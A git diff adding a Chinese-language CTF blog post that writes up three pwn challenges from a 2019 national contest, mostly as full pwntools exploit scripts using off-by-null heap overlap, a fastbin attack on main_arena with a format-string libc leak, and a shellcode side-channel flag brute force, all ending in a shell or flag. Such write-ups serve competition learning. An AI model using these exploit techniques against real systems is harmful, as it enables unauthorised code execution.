@@ -337,6 +337,158 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/06/国赛-华东北赛区/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peanuts">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peanuts'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/06/06/国赛-华东北赛区/" class="post-title-link" itemprop="url">国赛-华东北赛区</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-06-06 09:26:16 / Modified: 09:28:22" itemprop="dateCreated datePublished" datetime="2019-06-06T09:26:16+08:00">2019-06-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>周末打了华东北赛区的国赛，最后第三名，赛区大佬还是太多，最后佛性的最后一天的patch竟然都没上。。这里记录几个感觉比较有价值的题</p>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>比赛的时候没有刚出来，。。当时脑子坏了😂，结束之后在复现发现题目本身并不难。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用offbynull，做一个overlap，然后leak出地址，接着利用一个index越界到ptr指针实现对freehook的任意写，从而getshell</p>
+<h3 id="重要利用漏洞点"><a href="#重要利用漏洞点" class="headerlink" title="重要利用漏洞点"></a>重要利用漏洞点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;remarks&gt; &quot;);</span><br><span class="line">sub_B41(*((_BYTE **)ptr + 4), 64);</span><br><span class="line">printf(&quot;good bye %s\n&quot;, ptr);</span><br><span class="line">free(ptr);</span><br></pre></td></tr></table></figure>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line"> io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line"> io.sendlineafter(<span class="string">"&gt;"</span>,str(size))</span><br><span class="line"> io.sendlineafter(<span class="string">"&gt;"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line"> io.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line"> io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line"> io.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">io=process(<span class="string">"./pwn"</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">add(<span class="number">0x11</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x191</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x91</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x11</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'11'</span>)<span class="comment">#1 use off by null to overlap and leak libc</span></span><br><span class="line">add(<span class="number">0x81</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x11</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x81</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))<span class="number">-0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line"> add(<span class="number">0x191</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x191</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(libc+<span class="number">0x3c67a8</span>)[:<span class="number">6</span>]) <span class="comment"># modify the ptr poiter</span></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'4'</span>)</span><br><span class="line">io.sendline(p64(libc+<span class="number">0x4526a</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="magicheap"><a href="#magicheap" class="headerlink" title="magicheap"></a>magicheap</h2><p>这个题算是我的锅。。一个很简单的trick利用fastbin去改main_arena中储存的top_chunk的地址然后再分配时就会切割那一块地址（这最后一个利用链让我吃屎了好久。。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    a = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"172.29.2.105"</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the size of story: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please inpute the story: "</span>)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt; "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index&gt; "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.send(<span class="string">"%p"</span>*<span class="number">0x10</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">"Please"</span>)</span><br><span class="line">libc_addr = int(addr[<span class="number">5</span>:<span class="number">19</span>],<span class="number">16</span>)<span class="number">-0xf7260</span></span><br><span class="line">base_addr = int(addr[<span class="number">156</span>+<span class="number">1</span>:<span class="number">156</span>+<span class="number">14</span>+<span class="number">1</span>],<span class="number">16</span>)<span class="number">-0xa00</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"><span class="keyword">print</span> hex(base_addr)</span><br><span class="line">p.recvuntil(<span class="string">"ID"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">bss_str = base_addr+<span class="number">0x202060</span><span class="number">-0x8</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"aa"</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">"bb"</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">"bb"</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"cc"</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,p64(libc_addr+<span class="number">0x3c4b45</span>))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">"bb"</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">"bb"</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">"\0"</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(libc_addr+<span class="number">0x3c4aed</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">one=libc_addr+<span class="number">0xf1147</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(libc_addr+<span class="number">0x846CB</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Please input the size of story: "</span>)</span><br><span class="line"><span class="keyword">print</span> hex(one)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="shellcoder"><a href="#shellcoder" class="headerlink" title="shellcoder"></a>shellcoder</h2><p>题目给了我们几个可以利用的shellcode字符，然后给了4bytes的执行权限。动态调试的时候可以发现r9这个寄存器会根据我们输入name的长度不断变化，其中的偏移大概是0x16所以我们可以利用push r9;pop rax ;ret 来完成对v5字符串的覆值，我们输入的字符串转化成ascii码然后减去0x16+1就可以在r9寄存器中准确的储存了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=<span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccc</span><span class="params">(idx,v)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p=process(<span class="string">'./easy_pwn'</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">"b *0x400EA2"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">'172.29.2.106'</span>,<span class="number">9999</span>)</span><br><span class="line">    ru(<span class="string">'inputs your index?'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'input your code:'</span>)</span><br><span class="line">    se(<span class="string">'AQX\xc3'</span>)</span><br><span class="line">    ru(<span class="string">'tell me your name size:'</span>)</span><br><span class="line">    sl(str(<span class="number">0x200</span>))</span><br><span class="line">    ru(<span class="string">'input your name:'</span>)</span><br><span class="line">    se(<span class="string">'a'</span>*int(v<span class="number">-0x15</span>))</span><br><span class="line">    ru(<span class="string">'Hello are you ready? '</span>)</span><br><span class="line">    ru(<span class="string">'\n'</span>)</span><br><span class="line">    se(<span class="string">'\n'</span>)</span><br><span class="line">    data = ru(<span class="string">'\n'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">if</span> data[<span class="number">0</span>]==<span class="string">'b'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">charset =<span class="string">'&#123;&#125;_ '</span>+ string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">if</span>  ccc(i,ord(q)):</span><br><span class="line">            flag+=q</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<h4 id="多说的"><a href="#多说的" class="headerlink" title="多说的"></a>多说的</h4><p>还有几个题慢慢更新上来（几个简单的就不更新了），题目还是可以的，死亡赛区称号可还行。。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/21/RCTF-部分PWN解/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -962,7 +1114,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-count">5</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -985,7 +1137,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                    <span class="site-state-item-count">3</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
